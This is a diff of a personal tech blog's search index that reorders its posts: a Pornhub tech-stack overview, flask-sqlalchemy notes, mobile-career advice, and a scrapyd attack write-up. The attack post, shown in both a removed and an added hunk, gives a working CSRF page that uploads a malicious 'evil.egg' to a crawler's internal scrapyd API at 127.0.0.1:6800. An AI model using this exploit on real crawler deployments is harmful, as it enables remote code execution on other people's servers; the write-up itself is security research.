@@ -1523,21 +1523,6 @@ Ctrl + Shift +</code> 新建终端<br>Command + Up 向上滚动<br>Command + Dow
       </tags>
   </entry>
   <entry>
-    <title>pornhub technology stack</title>
-    <url>/2020/02/14/pornhub%E2%80%94en/</url>
-    <content><![CDATA[<p>What programming languages ​​does pornhub use?<br><a id="more"></a></p>
-<p>pornhub is now the world’s largest porn platform, with hundreds of millions of people browsing the website or the last video and live broadcast<br>Pornhub’s high concurrency is unimaginable. How exactly does pornhub’s technical team accomplish the high concurrency needs?</p>
-<h1 id="pornhub-technology-stack"><a href="#pornhub-technology-stack" class="headerlink" title="pornhub technology stack"></a>pornhub technology stack</h1><h2 id="rear-end"><a href="#rear-end" class="headerlink" title="rear end"></a>rear end</h2><p>Mainly Nginx, PHP, MySQL, Memcached / Redis.<br>Minor Varnish, ElasticSearch, NodeJS, Go, Vertica.</p>
-<h2 id="front-end"><a href="#front-end" class="headerlink" title="front end"></a>front end</h2><p>I used pure JavaScript and started using frameworks such as Vue.js.</p>
-<p>This is very surprising, PHP is the main language of the backend. The people who are black php are really faced, and the people who blow Java every day have nothing to say.<br>There are more than 42 billion visits to the P site in 2019, which means an average of 115 million visits per day. In 2019, Pornhub transmitted 6597PB of data, about 18,073 TB per day, and 209 gigabytes per second. In addition to huge page visits, there is huge video traffic that exceeds the traffic of YouTube, the world’s largest video site. It can be seen how powerful the technical support of pornographic websites is.</p>
-<ul>
-<li>When I use pornhub for a long time, there is no case of sending freeze.</li>
-</ul>
-<h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><p>It does n’t matter whether it ’s PHP or Java or other languages. Pornographic sites like pornhub have relatively fixed content. Cache databases such as redis can be used for long-term caching, combined with the powerful ElasticSearch search engine to quickly retrieve the database. , The search results are more popular and will not take up too much server resources.<br>pornhub’s main job is to ensure the smoothness of the video. It uses a large number of CDNs and is distributed around the world to accelerate the smoothness of the video.<br>At the same time, the main income of pornhub comes from paid members-pornhub Premium and advertising. During Black Friday, pornhub also had a discount activity-life members. Here, let’s analyze how pornhub’s ads bypass the blocking. Generally, we have ad blocking plugins similar to Adblock, which will greatly reduce the benefits of advertising. Pornhub uses websocket technology to bypass the detection of the corresponding script.</p>
-<h1 id="Support-for-China"><a href="#Support-for-China" class="headerlink" title="Support for China"></a>Support for China</h1><p>Although pornhub does not support intra-continental viewing, it has strengthened the support for Chinese, and a new website cn.pornhub.com has been added to enable native Chinese speakers to watch comfortably.</p>
-]]></content>
-  </entry>
-  <entry>
     <title>pornhub技术栈</title>
     <url>/2020/02/14/pornhub/</url>
     <content><![CDATA[<p>pornhub用了哪些编程语言<br><a id="more"></a></p>
@@ -1550,6 +1535,21 @@ Ctrl + Shift +</code> 新建终端<br>Command + Up 向上滚动<br>Command + Dow
 </ul>
 <h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>PHP也好，还是Java或者是其他语言，都不重要，像pornhub这样的色情网站，内容比较固定，利用redis等缓存数据库可以进行长时间缓存，结合强大的ElasticSearch搜索引擎快速检索数据库，一般来说，搜索结果比较大众化，不会占用太多的服务器资源。<br>pornhub最主要的工作就是保证视频的流畅，采用大量CDN，分布于全球各地，加速视频的流畅度。<br>同时，pornhub比较主要的收入来自于付费会员——pornhub Premium 和广告。黑五的时候pornhub还搞过打折活动——终身会员。这里，我们来分析下pornhub的广告如何绕过屏蔽，一般我们都有类似于Adblock这样的广告屏蔽插件，这会大大减少广告投放的收益，pornhub采用了websocket技术，绕过了对应script的检测。</p>
 <h1 id="对中国的支持"><a href="#对中国的支持" class="headerlink" title="对中国的支持"></a>对中国的支持</h1><p>尽管pornhub不支持大陆内观看，但是加强了对应中文的支持，新加了cn.pornhub.com的网址，使中文母语者可以舒适的观看。</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>pornhub technology stack</title>
+    <url>/2020/02/14/pornhub%E2%80%94en/</url>
+    <content><![CDATA[<p>What programming languages ​​does pornhub use?<br><a id="more"></a></p>
+<p>pornhub is now the world’s largest porn platform, with hundreds of millions of people browsing the website or the last video and live broadcast<br>Pornhub’s high concurrency is unimaginable. How exactly does pornhub’s technical team accomplish the high concurrency needs?</p>
+<h1 id="pornhub-technology-stack"><a href="#pornhub-technology-stack" class="headerlink" title="pornhub technology stack"></a>pornhub technology stack</h1><h2 id="rear-end"><a href="#rear-end" class="headerlink" title="rear end"></a>rear end</h2><p>Mainly Nginx, PHP, MySQL, Memcached / Redis.<br>Minor Varnish, ElasticSearch, NodeJS, Go, Vertica.</p>
+<h2 id="front-end"><a href="#front-end" class="headerlink" title="front end"></a>front end</h2><p>I used pure JavaScript and started using frameworks such as Vue.js.</p>
+<p>This is very surprising, PHP is the main language of the backend. The people who are black php are really faced, and the people who blow Java every day have nothing to say.<br>There are more than 42 billion visits to the P site in 2019, which means an average of 115 million visits per day. In 2019, Pornhub transmitted 6597PB of data, about 18,073 TB per day, and 209 gigabytes per second. In addition to huge page visits, there is huge video traffic that exceeds the traffic of YouTube, the world’s largest video site. It can be seen how powerful the technical support of pornographic websites is.</p>
+<ul>
+<li>When I use pornhub for a long time, there is no case of sending freeze.</li>
+</ul>
+<h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><p>It does n’t matter whether it ’s PHP or Java or other languages. Pornographic sites like pornhub have relatively fixed content. Cache databases such as redis can be used for long-term caching, combined with the powerful ElasticSearch search engine to quickly retrieve the database. , The search results are more popular and will not take up too much server resources.<br>pornhub’s main job is to ensure the smoothness of the video. It uses a large number of CDNs and is distributed around the world to accelerate the smoothness of the video.<br>At the same time, the main income of pornhub comes from paid members-pornhub Premium and advertising. During Black Friday, pornhub also had a discount activity-life members. Here, let’s analyze how pornhub’s ads bypass the blocking. Generally, we have ad blocking plugins similar to Adblock, which will greatly reduce the benefits of advertising. Pornhub uses websocket technology to bypass the detection of the corresponding script.</p>
+<h1 id="Support-for-China"><a href="#Support-for-China" class="headerlink" title="Support for China"></a>Support for China</h1><p>Although pornhub does not support intra-continental viewing, it has strengthened the support for Chinese, and a new website cn.pornhub.com has been added to enable native Chinese speakers to watch comfortably.</p>
 ]]></content>
   </entry>
   <entry>
@@ -1648,27 +1648,6 @@ Ctrl + Shift +</code> 新建终端<br>Command + Up 向上滚动<br>Command + Dow
       </tags>
   </entry>
   <entry>
-    <title>scrapy framework attack</title>
-    <url>/2020/02/13/scrapy-attack-en/</url>
-    <content><![CDATA[<p>How to attack scrapy<br><a id="more"></a></p>
-<h1 id="Ideas"><a href="#Ideas" class="headerlink" title="Ideas"></a>Ideas</h1><p>Scrapy is a crawler framework, and scrapyd is a cloud service. Users can upload the crawler developed by the scrapy framework to the cloud, and then call this crawler to crawl information through Web API.</p>
-<p>scrapyd mainly provides the following APIs:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/daemonstatus.json Get the status of the cloud service</span><br><span class="line">/addversion.json upload a new crawler project, or update the code of an existing project</span><br><span class="line">/schedule.json performs a crawl task</span><br><span class="line">/cancel.json stop and cancel a task</span><br><span class="line">/listprojects.json List all projects in the cloud</span><br><span class="line">/listversions.json lists all code versions of a project</span><br><span class="line">/listspiders.json List all spiders in a project. The concept of spider is in the scrapy framework. A spider developed by scrapy can have multiple spiders</span><br><span class="line">/listjobs.json lists all tasks, including three states in progress, completed, and pending</span><br><span class="line">/delversion.json delete a code version under a project</span><br><span class="line">/delversion.json delete an item</span><br></pre></td></tr></table></figure></p>
-<p>In simple terms, there can be multiple projects under the scrapyd cloud service, and each project can have multiple code versions. Each code version is a complete scrapy project, and there can be multiple spiders under a scrapy project. The final task The carrier is a spider.<br>An attacker can create a project and deploy his own version of scrapy code, deploy malicious code to the cloud, and then attack the scrapyd cloud.</p>
-<h1 id="Use-CSRF-vulnerability-to-attack-browser-crawlers"><a href="#Use-CSRF-vulnerability-to-attack-browser-crawlers" class="headerlink" title="Use CSRF vulnerability to attack browser crawlers"></a>Use CSRF vulnerability to attack browser crawlers</h1><p>The attack on port 6800 can be reproduced locally, but the target site’s 6800 is enabled on the internal network and we cannot directly access it.</p>
-<p>This URL is executed by the browser, and all scrapyd API interfaces can actually perform CSRF attacks, so we can use JavaScript in the page to send POST packets to port 6800, and then call those non-GET APIs.</p>
-<p>Construct a page that sends a POST upload request to <a href="http://127.0.0.1:6800/addversion.json" target="_blank" rel="noopener">http://127.0.0.1:6800/addversion.json</a>:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta http-equiv = &quot;content-type&quot; content = &quot;text / html; charset = utf-8&quot; /&gt;</span><br><span class="line"></span><br><span class="line">  &lt;title&gt; upload csrf &lt;/ title&gt;</span><br><span class="line"></span><br><span class="line">&lt;/ head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;script type = &quot;text / javascript&quot; charset = &quot;utf-8&quot;&gt;</span><br><span class="line">  function b64toBlob (b64Data, contentType, sliceSize) &#123;</span><br><span class="line">        contentType = contentType || &apos;&apos;;</span><br><span class="line">        sliceSize = sliceSize || 512;</span><br><span class="line"></span><br><span class="line">        var byteCharacters = atob (b64Data);</span><br><span class="line">        var byteArrays = [];</span><br><span class="line"></span><br><span class="line">        for (var offset = 0; offset &lt;byteCharacters.length; offset + = sliceSize) &#123;</span><br><span class="line">            var slice = byteCharacters.slice (offset, offset + sliceSize);</span><br><span class="line"></span><br><span class="line">            var byteNumbers = new Array (slice.length);</span><br><span class="line">            for (var i = 0; i &lt;slice.length; i ++) &#123;</span><br><span class="line">                byteNumbers [i] = slice.charCodeAt (i);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            var byteArray = new Uint8Array (byteNumbers);</span><br><span class="line"></span><br><span class="line">            byteArrays.push (byteArray);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      var blob = new Blob (byteArrays, &#123;type: contentType&#125;);</span><br><span class="line">      return blob;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    var blob = b64toBlob (&quot;base64 data of evil.egg ...&quot;, &apos;application / octet-stream&apos;)</span><br><span class="line"></span><br><span class="line">    var myFormData = new FormData ();</span><br><span class="line">    myFormData.append (&quot;egg&quot;, blob, &quot;evil.egg&quot;);</span><br><span class="line">    myFormData.append (&quot;project&quot;, &quot;evil_project_01&quot;)</span><br><span class="line">    myFormData.append (&quot;version&quot;, &quot;r01&quot;)</span><br><span class="line">    fetch (&quot;http://127.0.0.1:6800/addversion.json&quot;, &#123;</span><br><span class="line">        method: &quot;post&quot;,</span><br><span class="line">        body: myFormData</span><br><span class="line">    &#125;)</span><br><span class="line">  &lt;/ script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/ body&gt;</span><br><span class="line">&lt;/ html&gt;</span><br></pre></td></tr></table></figure>
-<p>It is worth noting that because we are uploading a binary file, I base.64 the evil.egg encoding: cat evil.egg | base64, and then convert it into a Blob object in JavaScript and add it to FormData.</p>
-<p>Submit this page to the crawler for crawling and successfully complete the entire exploitation process.</p>
-]]></content>
-      <categories>
-        <category>scrapy</category>
-      </categories>
-      <tags>
-        <tag>infiltration</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>scrapy框架攻击</title>
     <url>/2020/02/13/scrapy-attack/</url>
     <content><![CDATA[<p>如何攻击scrapy<br><a id="more"></a></p>
@@ -1687,6 +1666,27 @@ Ctrl + Shift +</code> 新建终端<br>Command + Up 向上滚动<br>Command + Dow
       </categories>
       <tags>
         <tag>渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>scrapy framework attack</title>
+    <url>/2020/02/13/scrapy-attack-en/</url>
+    <content><![CDATA[<p>How to attack scrapy<br><a id="more"></a></p>
+<h1 id="Ideas"><a href="#Ideas" class="headerlink" title="Ideas"></a>Ideas</h1><p>Scrapy is a crawler framework, and scrapyd is a cloud service. Users can upload the crawler developed by the scrapy framework to the cloud, and then call this crawler to crawl information through Web API.</p>
+<p>scrapyd mainly provides the following APIs:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/daemonstatus.json Get the status of the cloud service</span><br><span class="line">/addversion.json upload a new crawler project, or update the code of an existing project</span><br><span class="line">/schedule.json performs a crawl task</span><br><span class="line">/cancel.json stop and cancel a task</span><br><span class="line">/listprojects.json List all projects in the cloud</span><br><span class="line">/listversions.json lists all code versions of a project</span><br><span class="line">/listspiders.json List all spiders in a project. The concept of spider is in the scrapy framework. A spider developed by scrapy can have multiple spiders</span><br><span class="line">/listjobs.json lists all tasks, including three states in progress, completed, and pending</span><br><span class="line">/delversion.json delete a code version under a project</span><br><span class="line">/delversion.json delete an item</span><br></pre></td></tr></table></figure></p>
+<p>In simple terms, there can be multiple projects under the scrapyd cloud service, and each project can have multiple code versions. Each code version is a complete scrapy project, and there can be multiple spiders under a scrapy project. The final task The carrier is a spider.<br>An attacker can create a project and deploy his own version of scrapy code, deploy malicious code to the cloud, and then attack the scrapyd cloud.</p>
+<h1 id="Use-CSRF-vulnerability-to-attack-browser-crawlers"><a href="#Use-CSRF-vulnerability-to-attack-browser-crawlers" class="headerlink" title="Use CSRF vulnerability to attack browser crawlers"></a>Use CSRF vulnerability to attack browser crawlers</h1><p>The attack on port 6800 can be reproduced locally, but the target site’s 6800 is enabled on the internal network and we cannot directly access it.</p>
+<p>This URL is executed by the browser, and all scrapyd API interfaces can actually perform CSRF attacks, so we can use JavaScript in the page to send POST packets to port 6800, and then call those non-GET APIs.</p>
+<p>Construct a page that sends a POST upload request to <a href="http://127.0.0.1:6800/addversion.json" target="_blank" rel="noopener">http://127.0.0.1:6800/addversion.json</a>:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta http-equiv = &quot;content-type&quot; content = &quot;text / html; charset = utf-8&quot; /&gt;</span><br><span class="line"></span><br><span class="line">  &lt;title&gt; upload csrf &lt;/ title&gt;</span><br><span class="line"></span><br><span class="line">&lt;/ head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;script type = &quot;text / javascript&quot; charset = &quot;utf-8&quot;&gt;</span><br><span class="line">  function b64toBlob (b64Data, contentType, sliceSize) &#123;</span><br><span class="line">        contentType = contentType || &apos;&apos;;</span><br><span class="line">        sliceSize = sliceSize || 512;</span><br><span class="line"></span><br><span class="line">        var byteCharacters = atob (b64Data);</span><br><span class="line">        var byteArrays = [];</span><br><span class="line"></span><br><span class="line">        for (var offset = 0; offset &lt;byteCharacters.length; offset + = sliceSize) &#123;</span><br><span class="line">            var slice = byteCharacters.slice (offset, offset + sliceSize);</span><br><span class="line"></span><br><span class="line">            var byteNumbers = new Array (slice.length);</span><br><span class="line">            for (var i = 0; i &lt;slice.length; i ++) &#123;</span><br><span class="line">                byteNumbers [i] = slice.charCodeAt (i);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            var byteArray = new Uint8Array (byteNumbers);</span><br><span class="line"></span><br><span class="line">            byteArrays.push (byteArray);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      var blob = new Blob (byteArrays, &#123;type: contentType&#125;);</span><br><span class="line">      return blob;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    var blob = b64toBlob (&quot;base64 data of evil.egg ...&quot;, &apos;application / octet-stream&apos;)</span><br><span class="line"></span><br><span class="line">    var myFormData = new FormData ();</span><br><span class="line">    myFormData.append (&quot;egg&quot;, blob, &quot;evil.egg&quot;);</span><br><span class="line">    myFormData.append (&quot;project&quot;, &quot;evil_project_01&quot;)</span><br><span class="line">    myFormData.append (&quot;version&quot;, &quot;r01&quot;)</span><br><span class="line">    fetch (&quot;http://127.0.0.1:6800/addversion.json&quot;, &#123;</span><br><span class="line">        method: &quot;post&quot;,</span><br><span class="line">        body: myFormData</span><br><span class="line">    &#125;)</span><br><span class="line">  &lt;/ script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/ body&gt;</span><br><span class="line">&lt;/ html&gt;</span><br></pre></td></tr></table></figure>
+<p>It is worth noting that because we are uploading a binary file, I base.64 the evil.egg encoding: cat evil.egg | base64, and then convert it into a Blob object in JavaScript and add it to FormData.</p>
+<p>Submit this page to the crawler for crawling and successfully complete the entire exploitation process.</p>
+]]></content>
+      <categories>
+        <category>scrapy</category>
+      </categories>
+      <tags>
+        <tag>infiltration</tag>
       </tags>
   </entry>
   <entry>
@@ -2078,6 +2078,23 @@ Ctrl + Shift +</code> 新建终端<br>Command + Up 向上滚动<br>Command + Dow
       </tags>
   </entry>
   <entry>
+    <title>2020年最新flask-sqlalchemy用法总结(2)</title>
+    <url>/2020/02/11/flask-sqlalchemy2/</url>
+    <content><![CDATA[<p>最全的flask-sqlalchemy用法总结<br><a id="more"></a></p>
+<h1 id="SQLAlchemy常用数据类型"><a href="#SQLAlchemy常用数据类型" class="headerlink" title="SQLAlchemy常用数据类型"></a>SQLAlchemy常用数据类型</h1><p>Integer：整形，映射到数据库中是int类型。<br>Float：浮点类型，映射到数据库中是float类型。他占据的32位。<br>Double：双精度浮点类型，映射到数据库中是double类型，占据64位。<br>String：可变字符类型，映射到数据库中是varchar类型.<br>Boolean：布尔类型，映射到数据库中的是tinyint类型。<br>DECIMAL：定点类型。是专门为了解决浮点类型精度丢失的问题的。<br>Enum：枚举类型。指定某个字段只能是枚举中指定的几个值，不能为其他值。在ORM模型中，使用<br>Date：存储时间，只能存储年月日。映射到数据库中是date类型<br>DateTime：存储时间，可以存储年月日时分秒毫秒等<br>Time：存储时间，可以存储时分秒。映射到数据库中也是time类型<br>Text：存储长字符串。一般可以存储6W多个字符<br>LONGTEXT：长文本类型，映射到数据库中是longtext类型</p>
+<ul>
+<li>Enum：枚举类型用法<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">class TagEnum(enum.Enum):</span><br><span class="line">    python = &quot;python&quot;</span><br><span class="line">    flask = &quot;flask&quot;</span><br><span class="line">    django = &quot;django&quot;</span><br><span class="line"></span><br><span class="line">class Article(Base):</span><br><span class="line">    __tablename__ = &apos;article&apos;</span><br><span class="line">    id = Column(Integer,primary_key=True,autoincrement=True)</span><br><span class="line">    tag = Column(Enum(TagEnum))</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/04/25/flask-sqlalchemy-3/">sqlalchemy时间过滤How to filter date field?</a></li><li><a href="https://thelighter.github.io/2020/02/11/flask-sqlalchemy/">2020年最新flask-sqlalchemy用法总结(1)</a></li><li><a href="https://thelighter.github.io/2020/02/07/flask-time/">如何在Flask_sqlalchemy中查询时间段或者时间点？</a></li></ul></div>]]></content>
+      <categories>
+        <category>flask-sqlalchemy</category>
+      </categories>
+      <tags>
+        <tag>flask-sqlalchemy</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>2020年最新flask-sqlalchemy用法总结(1)</title>
     <url>/2020/02/11/flask-sqlalchemy/</url>
     <content><![CDATA[<p>flask-sqlalchemy一看就会<br><a id="more"></a></p>
@@ -2137,20 +2154,19 @@ mysql&gt; set session transaction isolation level read committed;
       </tags>
   </entry>
   <entry>
-    <title>2020年最新flask-sqlalchemy用法总结(2)</title>
-    <url>/2020/02/11/flask-sqlalchemy2/</url>
-    <content><![CDATA[<p>最全的flask-sqlalchemy用法总结<br><a id="more"></a></p>
-<h1 id="SQLAlchemy常用数据类型"><a href="#SQLAlchemy常用数据类型" class="headerlink" title="SQLAlchemy常用数据类型"></a>SQLAlchemy常用数据类型</h1><p>Integer：整形，映射到数据库中是int类型。<br>Float：浮点类型，映射到数据库中是float类型。他占据的32位。<br>Double：双精度浮点类型，映射到数据库中是double类型，占据64位。<br>String：可变字符类型，映射到数据库中是varchar类型.<br>Boolean：布尔类型，映射到数据库中的是tinyint类型。<br>DECIMAL：定点类型。是专门为了解决浮点类型精度丢失的问题的。<br>Enum：枚举类型。指定某个字段只能是枚举中指定的几个值，不能为其他值。在ORM模型中，使用<br>Date：存储时间，只能存储年月日。映射到数据库中是date类型<br>DateTime：存储时间，可以存储年月日时分秒毫秒等<br>Time：存储时间，可以存储时分秒。映射到数据库中也是time类型<br>Text：存储长字符串。一般可以存储6W多个字符<br>LONGTEXT：长文本类型，映射到数据库中是longtext类型</p>
-<ul>
-<li>Enum：枚举类型用法<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">class TagEnum(enum.Enum):</span><br><span class="line">    python = &quot;python&quot;</span><br><span class="line">    flask = &quot;flask&quot;</span><br><span class="line">    django = &quot;django&quot;</span><br><span class="line"></span><br><span class="line">class Article(Base):</span><br><span class="line">    __tablename__ = &apos;article&apos;</span><br><span class="line">    id = Column(Integer,primary_key=True,autoincrement=True)</span><br><span class="line">    tag = Column(Enum(TagEnum))</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/04/25/flask-sqlalchemy-3/">sqlalchemy时间过滤How to filter date field?</a></li><li><a href="https://thelighter.github.io/2020/02/11/flask-sqlalchemy/">2020年最新flask-sqlalchemy用法总结(1)</a></li><li><a href="https://thelighter.github.io/2020/02/07/flask-time/">如何在Flask_sqlalchemy中查询时间段或者时间点？</a></li></ul></div>]]></content>
+    <title>Is there any future for mobile development?</title>
+    <url>/2020/02/11/android-2/</url>
+    <content><![CDATA[<p>Should I do mobile development or back-end development?<br>&lt;!-more-&gt;</p>
+<h1 id="Trend"><a href="#Trend" class="headerlink" title="Trend"></a>Trend</h1><p>With the development of the times, the mobile terminal has replaced the PC terminal and has become the most commonly used Internet portal for daily use. Now the mobile terminal is mainly divided into two camps, Android and iOS, corresponding to Google and Apple. Market development direction. They even developed new programming languages ​​for Android and Ios, such as kotlin and swift, etc. They all hope that developers can rely more on their own platform, so that users can rely more on mobile.</p>
+<p>But after you study these several languages ​​designed for mobile development, you will find that there is very little demand for mobile development in small companies, except for large companies, because it will increase the cost of the enterprise. And responsive web pages can make mobile users happy to use. Faced with this market form, Facebook and Google have designed better mobile programming languages ​​for developers—react native and flutter. These two languages ​​can be written at one time and can be applied to both Android and iOS, saving a lot of time For developers and businesses. flutter can even be applied to H5 and the web.</p>
+<p>alert! From the above we can see that mobile terminal development is dominated by giants, which is not in line with the spirit of open source. In particular, development platforms such as iOS are a nightmare for developers, so after you learn the native development language, you can only serve For large enterprises, it is difficult to turn to other development directions. The future of mobile is hard to say, and it is possible that these native programming languages ​​will be eliminated.</p>
+<h1 id="Engage-in-back-end-development"><a href="#Engage-in-back-end-development" class="headerlink" title="Engage in back-end development"></a>Engage in back-end development</h1><p>Every enterprise needs back-end development talents, and a large number of businesses need back-end development languages ​​to process, such as Java and Python, so the scope of employment is very broad</p>
+<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/02/11/android-1/">移动端开发到底有没有前途</a></li><li><a href="https://thelighter.github.io/2020/02/04/apple-app-7/">一键生成所有尺寸的应用图标和启动图</a></li></ul></div>]]></content>
       <categories>
-        <category>flask-sqlalchemy</category>
+        <category>Mobile Development</category>
       </categories>
       <tags>
-        <tag>flask-sqlalchemy</tag>
+        <tag>Android</tag>
       </tags>
   </entry>
   <entry>
@@ -2164,22 +2180,6 @@ mysql&gt; set session transaction isolation level read committed;
 <div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/02/11/android-2/">Is there any future for mobile development?</a></li><li><a href="https://thelighter.github.io/2020/02/04/apple-app-7/">一键生成所有尺寸的应用图标和启动图</a></li></ul></div>]]></content>
       <categories>
         <category>移动开发</category>
-      </categories>
-      <tags>
-        <tag>Android</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Is there any future for mobile development?</title>
-    <url>/2020/02/11/android-2/</url>
-    <content><![CDATA[<p>Should I do mobile development or back-end development?<br>&lt;!-more-&gt;</p>
-<h1 id="Trend"><a href="#Trend" class="headerlink" title="Trend"></a>Trend</h1><p>With the development of the times, the mobile terminal has replaced the PC terminal and has become the most commonly used Internet portal for daily use. Now the mobile terminal is mainly divided into two camps, Android and iOS, corresponding to Google and Apple. Market development direction. They even developed new programming languages ​​for Android and Ios, such as kotlin and swift, etc. They all hope that developers can rely more on their own platform, so that users can rely more on mobile.</p>
-<p>But after you study these several languages ​​designed for mobile development, you will find that there is very little demand for mobile development in small companies, except for large companies, because it will increase the cost of the enterprise. And responsive web pages can make mobile users happy to use. Faced with this market form, Facebook and Google have designed better mobile programming languages ​​for developers—react native and flutter. These two languages ​​can be written at one time and can be applied to both Android and iOS, saving a lot of time For developers and businesses. flutter can even be applied to H5 and the web.</p>
-<p>alert! From the above we can see that mobile terminal development is dominated by giants, which is not in line with the spirit of open source. In particular, development platforms such as iOS are a nightmare for developers, so after you learn the native development language, you can only serve For large enterprises, it is difficult to turn to other development directions. The future of mobile is hard to say, and it is possible that these native programming languages ​​will be eliminated.</p>
-<h1 id="Engage-in-back-end-development"><a href="#Engage-in-back-end-development" class="headerlink" title="Engage in back-end development"></a>Engage in back-end development</h1><p>Every enterprise needs back-end development talents, and a large number of businesses need back-end development languages ​​to process, such as Java and Python, so the scope of employment is very broad</p>
-<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/02/11/android-1/">移动端开发到底有没有前途</a></li><li><a href="https://thelighter.github.io/2020/02/04/apple-app-7/">一键生成所有尺寸的应用图标和启动图</a></li></ul></div>]]></content>
-      <categories>
-        <category>Mobile Development</category>
       </categories>
       <tags>
         <tag>Android</tag>
